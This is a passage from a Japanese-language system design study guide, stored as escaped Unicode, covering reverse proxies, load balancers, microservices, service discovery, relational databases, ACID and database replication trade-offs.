\u3092\u5404\u30b5\u30fc\u30d0\u30fc\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3059\u308b\u5fc5\u8981\u304c\u306a\u304f\u306a\u308a\u307e\u3059\u3002\n* **\u5727\u7e2e** - \u30b5\u30fc\u30d0\u30fc\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u5727\u7e2e\u3067\u304d\u307e\u3059\n* **\u30ad\u30e3\u30c3\u30b7\u30f3\u30b0** - \u30ad\u30e3\u30c3\u30b7\u30e5\u3055\u308c\u305f\u30ea\u30af\u30a8\u30b9\u30c8\u306b\u5bfe\u3057\u3066\u3001\u30ec\u30b9\u30dd\u30f3\u30b9\u3092\u8fd4\u3057\u307e\u3059\n* **\u9759\u7684\u30b3\u30f3\u30c6\u30f3\u30c4** - \u9759\u7684\u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u76f4\u63a5\u9001\u4fe1\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n    * HTML\/CSS\/JS\n    * \u5199\u771f\n    * \u52d5\u753b\n    * \u306a\u3069\u306a\u3069\n\n### \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc vs \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\n\n* \u8907\u6570\u306e\u30b5\u30fc\u30d0\u30fc\u304c\u3042\u308b\u6642\u306b\u306f\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3092\u30c7\u30d7\u30ed\u30a4\u3059\u308b\u3068\u5f79\u306b\u7acb\u3064\u3067\u3057\u3087\u3046\u3002 \u3057\u3070\u3057\u3070\u3001\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306f\u540c\u3058\u6a5f\u80fd\u3092\u679c\u305f\u3059\u30b5\u30fc\u30d0\u30fc\u7fa4\u3078\u306e\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3092\u634c\u304d\u307e\u3059\u3002\n* \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u3067\u306f\u3001\u4e0a\u8a18\u306b\u8ff0\u3079\u305f\u3088\u3046\u306a\u5229\u70b9\u3092\u3001\u5358\u4e00\u306e\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u3084\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ec\u30a4\u30e4\u30fc\u306b\u5bfe\u3057\u3066\u3082\u793a\u3059\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\n* NGINX \u3084 HAProxy \u306a\u3069\u306e\u6280\u8853\u306flayer 7 \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u3068\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306e\u4e21\u65b9\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u307e\u3059\u3002\n\n### \u6b20\u70b9: \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\n\n* \u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u3092\u5c0e\u5165\u3059\u308b\u3068\u30b7\u30b9\u30c6\u30e0\u306e\u8907\u96d1\u6027\u304c\u5897\u3057\u307e\u3059\u3002\n* \u5358\u4e00\u306e\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u306f\u5358\u4e00\u969c\u5bb3\u70b9\u306b\u306a\u308a\u3048\u307e\u3059\u3002\u4e00\u65b9\u3067\u3001\u8907\u6570\u306e\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7\u3092\u5c0e\u5165\u3059\u308b\u3068(\u4f8b: [\u30d5\u30a7\u30a4\u30eb\u30aa\u30fc\u30d0\u30fc](https:\/\/en.wikipedia.org\/wiki\/Failover)) \u8907\u96d1\u6027\u306f\u3088\u308a\u5897\u3057\u307e\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30ea\u30d0\u30fc\u30b9\u30d7\u30ed\u30ad\u30b7 vs \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc](https:\/\/www.nginx.com\/resources\/glossary\/reverse-proxy-vs-load-balancer\/)\n* [NGINX \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/www.nginx.com\/blog\/inside-nginx-how-we-designed-for-performance-scale\/)\n* [HAProxy \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3 \u30ac\u30a4\u30c9](http:\/\/www.haproxy.org\/download\/1.2\/doc\/architecture.txt)\n* [Wikipedia](https:\/\/en.wikipedia.org\/wiki\/Reverse_proxy)\n\n## \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/yB5SYwm.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/lethain.com\/introduction-to-architecting-systems-for-scale\/#platform_layer>Source: Intro to architecting systems for scale<\/a><\/i>\n<\/p>\n\n\u30a6\u30a7\u30d6\u30ec\u30a4\u30e4\u30fc\u3092\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64 (\u30d7\u30e9\u30c3\u30c8\u30d5\u30a9\u30fc\u30e0\u5c64\u3068\u3082\u8a00\u308f\u308c\u308b) \u3068\u5206\u96e2\u3059\u308b\u3053\u3068\u3067\u305d\u308c\u305e\u308c\u306e\u5c64\u3092\u72ec\u7acb\u306b\u30b9\u30b1\u30fc\u30eb\u3001\u8a2d\u5b9a\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u65b0\u3057\u3044API\u3092\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\u306b\u8ffd\u52a0\u3059\u308b\u969b\u306b\u3001\u4e0d\u5fc5\u8981\u306b\u30a6\u30a7\u30d6\u30b5\u30fc\u30d0\u30fc\u3092\u8ffd\u52a0\u3059\u308b\u5fc5\u8981\u304c\u306a\u304f\u306a\u308a\u307e\u3059\u3002\n\n **\u5358\u4e00\u8cac\u4efb\u306e\u539f\u5247** \u3067\u306f\u3001\u5c0f\u3055\u3044\u81ea\u5f8b\u7684\u306a\u30b5\u30fc\u30d3\u30b9\u304c\u5354\u8abf\u3057\u3066\u52d5\u304f\u3088\u3046\u306b\u63d0\u5531\u3057\u3066\u3044\u307e\u3059\u3002\u5c0f\u3055\u3044\u30b5\u30fc\u30d3\u30b9\u306e\u5c0f\u3055\u3044\u30c1\u30fc\u30e0\u304c\u6025\u6210\u9577\u306e\u305f\u3081\u306b\u3088\u308a\u7a4d\u6975\u7684\u306a\u8a08\u753b\u3092\u7acb\u3066\u3089\u308c\u308b\u3088\u3046\u306b\u3059\u308b\u305f\u3081\u3067\u3059\u3002\n\n\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\u306f[\u975e\u540c\u671f\u51e6\u7406](#\u975e\u540c\u671f\u51e6\u7406)\u3082\u30b5\u30dd\u30fc\u30c8\u3057\u307e\u3059\u3002\n\n### \u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\n\n\u72ec\u7acb\u3057\u3066\u30c7\u30d7\u30ed\u30a4\u3067\u304d\u308b\u3001\u5c0f\u898f\u6a21\u306a\u30e2\u30b8\u30e5\u30fc\u30eb\u69d8\u5f0f\u3067\u3042\u308b[\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9](https:\/\/en.wikipedia.org\/wiki\/Microservices)\u3082\u3053\u306e\u8b70\u8ad6\u306b\u95a2\u4fc2\u3057\u3066\u304f\u308b\u6280\u8853\u3067\u3057\u3087\u3046\u3002\u305d\u308c\u305e\u308c\u306e\u30b5\u30fc\u30d3\u30b9\u306f\u72ec\u81ea\u306e\u30d7\u30ed\u30bb\u30b9\u3092\u51e6\u7406\u3057\u3001\u660e\u78ba\u3067\u8efd\u91cf\u306a\u30e1\u30ab\u30cb\u30ba\u30e0\u3067\u901a\u4fe1\u3057\u3066\u3001\u305d\u306e\u76ee\u7684\u3068\u3059\u308b\u6a5f\u80fd\u3092\u5b9f\u73fe\u3057\u307e\u3059\u3002<sup><a href=https:\/\/smartbear.com\/learn\/api-design\/what-are-microservices>1<\/a><\/sup>\n\n\u4f8b\u3048\u3070Pinterest\u3067\u306f\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u306b\u5206\u304b\u308c\u3066\u3044\u307e\u3059\u3002\u30e6\u30fc\u30b6\u30fc\u30d7\u30ed\u30d5\u30a3\u30fc\u30eb\u3001\u30d5\u30a9\u30ed\u30ef\u30fc\u3001\u30d5\u30a3\u30fc\u30c9\u3001\u691c\u7d22\u3001\u5199\u771f\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u306a\u3069\u3067\u3059\u3002\n\n### \u30b5\u30fc\u30d3\u30b9\u30c7\u30a3\u30b9\u30ab\u30d0\u30ea\u30fc\n\n[Consul](https:\/\/www.consul.io\/docs\/index.html)\u3001 [Etcd](https:\/\/coreos.com\/etcd\/docs\/latest)\u3001 [Zookeeper](http:\/\/www.slideshare.net\/sauravhaloi\/introduction-to-apache-zookeeper) \u306a\u3069\u306e\u30b7\u30b9\u30c6\u30e0\u3067\u306f\u3001\u767b\u9332\u3055\u308c\u3066\u3044\u308b\u30b5\u30fc\u30d3\u30b9\u306e\u540d\u524d\u3001\u30a2\u30c9\u30ec\u30b9\u3001\u30dd\u30fc\u30c8\u306e\u60c5\u5831\u3092\u76e3\u8996\u3059\u308b\u3053\u3068\u3067\u3001\u30b5\u30fc\u30d3\u30b9\u540c\u58eb\u304c\u4e92\u3044\u3092\u898b\u3064\u3051\u3084\u3059\u304f\u3057\u3066\u3044\u307e\u3059\u3002\u30b5\u30fc\u30d3\u30b9\u306e\u5b8c\u5168\u6027\u306e\u78ba\u8a8d\u306b\u306f [Health checks](https:\/\/www.consul.io\/intro\/getting-started\/checks.html) \u304c\u4fbf\u5229\u3067\u3001\u3053\u308c\u306b\u306f [HTTP](#hypertext-transfer-protocol-http) \u30a8\u30f3\u30c9\u30dd\u30a4\u30f3\u30c8\u304c\u3088\u304f\u4f7f\u308f\u308c\u307e\u3059\u3002 Consul \u3068 Etcd \u306e\u3044\u305a\u308c\u3082\u7d44\u307f\u8fbc\u307f\u306e [key-value store](#\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2) \u3092\u6301\u3063\u3066\u304a\u308a\u3001\u8a2d\u5b9a\u30c7\u30fc\u30bf\u3084\u5171\u6709\u30c7\u30fc\u30bf\u306a\u3069\u306e\u30c7\u30fc\u30bf\u3092\u4fdd\u5b58\u3057\u3066\u304a\u304f\u3053\u3068\u306b\u4f7f\u308f\u308c\u307e\u3059\u3002\n\n### \u6b20\u70b9: \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\n\n* \u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u3001\u904b\u7528\u3001\u305d\u3057\u3066\u30d7\u30ed\u30bb\u30b9\u3092\u8003\u616e\u3059\u308b\u3068\u3001\u7de9\u304f\u7d50\u3073\u4ed8\u3051\u3089\u308c\u305f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u5c64\u3092\u8ffd\u52a0\u3059\u308b\u306b\u306f\u3001\u30e2\u30ce\u30ea\u30b7\u30c3\u30af\u306a\u30b7\u30b9\u30c6\u30e0\u3068\u306f\u7570\u306a\u308b\u30a2\u30d7\u30ed\u30fc\u30c1\u304c\u5fc5\u8981\u3067\u3059\u3002\n* \u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u306f\u30c7\u30d7\u30ed\u30a4\u3068\u904b\u7528\u306e\u70b9\u304b\u3089\u898b\u308b\u3068\u8907\u96d1\u6027\u304c\u5897\u3059\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30b9\u30b1\u30fc\u30eb\u3059\u308b\u30b7\u30b9\u30c6\u30e0\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u3092\u8a2d\u8a08\u3059\u308b\u305f\u3081\u306e\u30a4\u30f3\u30c8\u30ed](http:\/\/lethain.com\/introduction-to-architecting-systems-for-scale)\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30a4\u30f3\u30bf\u30d3\u30e5\u30fc\u3092\u7d10\u89e3\u304f](http:\/\/www.puncsky.com\/blog\/2016-02-13-crack-the-system-design-interview)\n* [\u30b5\u30fc\u30d3\u30b9\u6307\u5411\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](https:\/\/en.wikipedia.org\/wiki\/Service-oriented_architecture)\n* [Zookeeper\u306e\u30a4\u30f3\u30c8\u30ed\u30c0\u30af\u30b7\u30e7\u30f3](http:\/\/www.slideshare.net\/sauravhaloi\/introduction-to-apache-zookeeper)\n* [\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u3092\u4f5c\u308b\u305f\u3081\u306b\u77e5\u3063\u3066\u304a\u304d\u305f\u3044\u3053\u3068](https:\/\/cloudncode.wordpress.com\/2016\/07\/22\/msa-getting-started\/)\n\n## \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/Xkm5CXz.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/www.youtube.com\/watch?v=w95murBkYmU>Source: Scaling up to your first 10 million users<\/a><\/i>\n<\/p>\n\n### \u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30de\u30cd\u30b8\u30e1\u30f3\u30c8\u30b7\u30b9\u30c6\u30e0 (RDBMS)\n\nSQL\u306a\u3069\u306e\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u30c6\u30fc\u30d6\u30eb\u306b\u6574\u7406\u3055\u308c\u305f\u30c7\u30fc\u30bf\u306e\u96c6\u5408\u3067\u3042\u308b\u3002\n\n**ACID** \u306f\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u304a\u3051\u308b[\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3](https:\/\/en.wikipedia.org\/wiki\/Database_transaction)\u306e\u30d7\u30ed\u30d1\u30c6\u30a3\u306e\u96c6\u5408\u3067\u3042\u308b\n\n* **\u4e0d\u53ef\u5206\u6027** - \u305d\u308c\u305e\u308c\u306e\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u306f\u3042\u308b\u304b\u306a\u3044\u304b\u306e\u3044\u305a\u308c\u304b\u3067\u3042\u308b\n* **\u4e00\u8cab\u6027** - \u3069\u3093\u306a\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3082\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092\u3042\u308b\u78ba\u304b\u306a\u72b6\u614b\u304b\u3089\u6b21\u306e\u72b6\u614b\u306b\u9077\u79fb\u3055\u305b\u308b\u3002\n* **\u72ec\u7acb\u6027** - \u540c\u6642\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3092\u51e6\u7406\u3059\u308b\u3053\u3068\u306f\u3001\u9023\u7d9a\u7684\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3092\u51e6\u7406\u3059\u308b\u306e\u3068\u540c\u3058\u7d50\u679c\u3092\u3082\u305f\u3089\u3059\u3002\n* **\u6c38\u7d9a\u6027** - \u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u304c\u51e6\u7406\u3055\u308c\u305f\u3089\u3001\u305d\u306e\u3088\u3046\u306b\u4fdd\u5b58\u3055\u308c\u308b\n\n\u30ea\u30ec\u30fc\u30b7\u30e7\u30ca\u30eb\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092\u30b9\u30b1\u30fc\u30eb\u3055\u305b\u308b\u305f\u3081\u306b\u306f\u305f\u304f\u3055\u3093\u306e\u6280\u8853\u304c\u3042\u308b: **\u30de\u30b9\u30bf\u30fc\u30fb\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3**\u3001 **\u30de\u30b9\u30bf\u30fc\u30fb\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3**\u3001 **federation**\u3001 **\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0**\u3001 **\u975e\u6b63\u898f\u5316**\u3001 \u305d\u3057\u3066 **SQL \u30c1\u30e5\u30fc\u30cb\u30f3\u30b0**\n\n#### \u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n\u30de\u30b9\u30bf\u30fc\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304c\u8aad\u307f\u53d6\u308a\u3068\u66f8\u304d\u8fbc\u307f\u3092\u51e6\u7406\u3057\u3001\u66f8\u304d\u8fbc\u307f\u3092\u4e00\u3064\u4ee5\u4e0a\u306e\u30b9\u30ec\u30fc\u30d6\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u8907\u88fd\u3057\u307e\u3059\u3002\u30b9\u30ec\u30fc\u30d6\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u8aad\u307f\u53d6\u308a\u306e\u307f\u3092\u51e6\u7406\u3057\u307e\u3059\u3002\u30b9\u30ec\u30fc\u30d6\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306f\u6728\u69cb\u9020\u306e\u3088\u3046\u306b\u8ffd\u52a0\u306e\u30b9\u30ec\u30fc\u30d6\u306b\u30c7\u30fc\u30bf\u3092\u8907\u88fd\u3059\u308b\u3053\u3068\u3082\u3067\u304d\u307e\u3059\u3002\u30de\u30b9\u30bf\u30fc\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304c\u30aa\u30d5\u30e9\u30a4\u30f3\u306b\u306a\u3063\u305f\u5834\u5408\u306b\u306f\u3001\u3044\u305a\u308c\u304b\u306e\u30b9\u30ec\u30fc\u30d6\u304c\u30de\u30b9\u30bf\u30fc\u306b\u6607\u683c\u3059\u308b\u304b\u3001\u65b0\u3057\u3044\u30de\u30b9\u30bf\u30fc\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304c\u8ffd\u52a0\u3055\u308c\u308b\u307e\u3067\u306f\u8aad\u307f\u53d6\u308a\u5c02\u7528\u30e2\u30fc\u30c9\u3067\u7a3c\u50cd\u3057\u307e\u3059\u3002\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/C9ioGtn.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/>Source: Scalability, availability, stability, patterns<\/a><\/i>\n<\/p>\n\n##### \u6b20\u70b9: \u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n* \u30b9\u30ec\u30fc\u30d6\u3092\u30de\u30b9\u30bf\u30fc\u306b\u6607\u683c\u3055\u305b\u308b\u306b\u306f\u8ffd\u52a0\u306e\u30ed\u30b8\u30c3\u30af\u304c\u5fc5\u8981\u306b\u306a\u308b\u3002\n* \u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3001\u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e **\u4e21\u65b9** \u306e\u6b20\u70b9\u306f[\u6b20\u70b9: \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u6b20\u70b9-\u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3)\u3092\u53c2\u7167\n\n#### \u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n\u3044\u305a\u308c\u306e\u30de\u30b9\u30bf\u30fc\u3082\u8aad\u307f\u53d6\u308a\u66f8\u304d\u8fbc\u307f\u306e\u4e21\u65b9\u306b\u5bfe\u5fdc\u3059\u308b\u3002\u66f8\u304d\u8fbc\u307f\u306b\u95a2\u3057\u3066\u306f\u305d\u308c\u305e\u308c\u5354\u8abf\u3059\u308b\u3002\u3044\u305a\u308c\u304b\u306e\u30de\u30b9\u30bf\u30fc\u304c\u843d\u3061\u3066\u3082\u3001\u30b7\u30b9\u30c6\u30e0\u5168\u4f53\u3068\u3057\u3066\u306f\u8aad\u307f\u66f8\u304d\u4e21\u65b9\u306b\u5bfe\u5fdc\u3057\u305f\u307e\u307e\u904b\u7528\u3067\u304d\u308b\u3002\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/krAHLGg.png\"\/>\n  <br\/>\n  <i><a href=http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/>Source: Scalability, availability, stability, patterns<\/a><\/i>\n<\/p>\n\n##### \u6b20\u70b9: \u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n* \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u3092\u5c0e\u5165\u3059\u308b\u304b\u3001\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u30ed\u30b8\u30c3\u30af\u3092\u5909\u66f4\u3059\u308b\u3053\u3068\u3067\u3069\u3053\u306b\u66f8\u304d\u8fbc\u3080\u304b\u3092\u6307\u5b9a\u3057\u306a\u3051\u308c\u3070\u306a\u3089\u306a\u3044\u3002\n* \u5927\u4f53\u306e\u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc\u30b7\u30b9\u30c6\u30e0\u306f\u3001\u4e00\u8cab\u6027\u304c\u7de9\u3044\uff08ACID\u539f\u7406\u3092\u5b88\u3063\u3066\u3044\u306a\u3044\uff09\u3082\u3057\u304f\u306f\u3001\u540c\u671f\u3059\u308b\u6642\u9593\u304c\u304b\u304b\u308b\u305f\u3081\u306b\u66f8\u304d\u8fbc\u307f\u306e\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u304c\u5897\u52a0\u3057\u3066\u3057\u307e\u3063\u3066\u3044\u308b\u3002\n* \u66f8\u304d\u8fbc\u307f\u30ce\u30fc\u30c9\u304c\u8ffd\u52a0\u3055\u308c\u3001\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u304c\u5897\u52a0\u3059\u308b\u306b\u3064\u308c\u66f8\u304d\u8fbc\u307f\u306e\u885d\u7a81\u306e\u53ef\u80fd\u6027\u304c\u5897\u3048\u308b\u3002\n* \u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6 \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3001\u30de\u30b9\u30bf\u30fc\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e **\u4e21\u65b9** \u306e\u6b20\u70b9\u306f[\u6b20\u70b9: \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](#\u6b20\u70b9-\u30de\u30b9\u30bf\u30fc\u30b9\u30ec\u30fc\u30d6-\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3) \u3092\u53c2\u7167\n\n##### \u6b20\u70b9: \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n* \u65b0\u3057\u3044\u30c7\u30fc\u30bf\u66f8\u304d\u8fbc\u307f\u3092\u8907\u88fd\u3059\u308b\u524d\u306b\u30de\u30b9\u30bf\u30fc\u304c\u843d\u3061\u305f\u5834\u5408\u306b\u306f\u305d\u306e\u30c7\u30fc\u30bf\u304c\u5931\u308f\u308c\u3066\u3057\u307e\u3046\u53ef\u80fd\u6027\u304c\u3042\u308b\u3002\n* \u66f8\u304d\u8fbc\u307f\u306f\u8aad\u307f\u53d6\u308a\u30ec\u30d7\u30ea\u30ab\u306b\u304a\u3044\u3066\u30ea\u30d7\u30ec\u30a4\u3055\u308c\u308b\u3002\u66f8\u304d\u8fbc\u307f\u304c\u591a\u3044\u5834\u5408\u3001\u8907\u88fd\u30ce\u30fc\u30c9\u304c\u66f8\u304d\u8fbc\u307f\u306e\u51e6\u7406\u306e\u307f\u3067\u884c\u304d\u8a70\u307e\u3063\u3066\u3001\u8aad\u307f\u53d6\u308a\u306e\u51e6\u7406\u3092\u6e80\u8db3\u306b\u884c\u3048\u306a\u3044\u53ef\u80fd\u6027\u304c\u3042\u308b\u3002\n* \u8aad\u307f\u53d6\u308a\u30b9\u30ec\u30fc\u30d6\u30ce\u30fc\u30c9\u306e\u6570\u304c\u591a\u3051\u308c\u3070\u591a\u3044\u307b\u3069\u3001\u8907\u88fd\u3057\u306a\u3051\u308c\u3070\u306a\u3089\u306a\u3044\u6570\u3082\u5897\u3048\u3001\u8907\u88fd\u6642\u9593\u304c\u4f38\u3073\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n* \u30b7\u30b9\u30c6\u30e0\u306b\u3088\u3063\u3066\u306f\u3001\u30de\u30b9\u30bf\u30fc\u3078\u306e\u66f8\u304d\u8fbc\u307f\u306f\u30de\u30eb\u30c1\u30b9\u30ec\u30c3\u30c9\u3067\u4e26\u5217\u51e6\u7406\u3067\u304d\u308b\u4e00\u65b9\u3001\u30b9\u30ec\u30fc\u30d6\u3078\u306e\u8907\u88fd\u306f\u5358\u4e00\u30b9\u30ec\u30c3\u30c9\u3067\u9023\u7d9a\u7684\u306b\u51e6\u7406\u3057\u306a\u3051\u308c\u3070\u306a\u3089\u306a\u3044\u5834\u5408\u304c\u3042\u308a\u307e\u3059\u3002\n* \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3067\u306f\u8ffd\u52a0\u306e\u30cf\u30fc\u30c9\u30a6\u30a7\u30a2\u304c\u5fc5\u8981\u306b\u306a\u308a\u3001\u8907\u96d1\u6027\u3082\u5897\u3057\u307e\u3059\u3002\n\n##### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3001 \u53ef\u7528\u6027\u3001 \u30b9\u30bf\u30d3\u30ea\u30c6\u30a3 \u30d1\u30bf\u30fc\u30f3](http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/)\n* [\u30de\u30eb\u30c1\u30de\u30b9\u30bf\u30fc \u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3](https:\/\/en.wikipedia.org\/wiki\/Multi-master_replication)\n\n#### Federation\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/U3qV33e.png\"\/>\n  <br\/>\n  <i><a href=https:\/\/www.youtube.com\/watch?v=w95murBkYmU>Source: Scaling up to your first 10 million users<\/a><\/i>\n<\/p>\n\n\u30d5\u30a7\u30c7\u30ec\u30fc\u30b7\u30e7\u30f3 (\u3082\u3057\u304f\u306f\u6a5f\u80fd\u5206\u5272\u5316\u3068\u3082\u8a00\u3046) \u306f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092\u6a5f\u80fd\u3054\u3068\u306b\u5206\u5272\u3059\u308b\u3002\u4f8b\u3048\u3070\u3001\u30e2\u30ce\u30ea\u30b7\u30c3\u30af\u306a\u5358\u4e00\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306e\u4ee3\u308f\u308a\u306b\u3001\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u3092 **\u30d5\u30a9\u30fc\u30e9\u30e0**\u3001 **\u30e6\u30fc\u30b6\u30fc**\u3001 **\u30d7\u30ed\u30c0\u30af\u30c8** 